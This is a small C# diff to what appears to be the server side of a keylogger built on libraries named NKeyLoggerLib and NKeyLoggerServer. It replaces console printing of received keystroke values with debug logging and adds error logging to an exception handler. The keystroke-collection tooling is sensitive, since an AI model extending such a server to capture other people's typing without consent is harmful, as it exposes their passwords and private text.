@@ -1,6 +1,7 @@
 ﻿using System.Linq.Expressions;
 using System.Runtime.CompilerServices;
 using System.Security.Cryptography;
+using Microsoft.Extensions.Logging;
 using NKeyLoggerLib;
 using NKeyLoggerServer;
 class Program
@@ -17,7 +18,7 @@ class Program
 
             server.keyHandler += (Server serv, Network user, AbstractKeyInfo key) =>
             {
-                Console.WriteLine(key.getValues().First() + " " + key.getValues().ElementAt(3));
+                Log<Program>.Instance.logger?.LogDebug(key.getValues().First() + " " + key.getValues().ElementAt(3));
             };
 
             server.updateTask += (Task t) =>
@@ -40,7 +41,7 @@ class Program
         }
         catch (Exception ex)
         {
-            //TODO
+            Log<Program>.Instance.logger?.LogError(ex.ToString());
         }
     }
 }
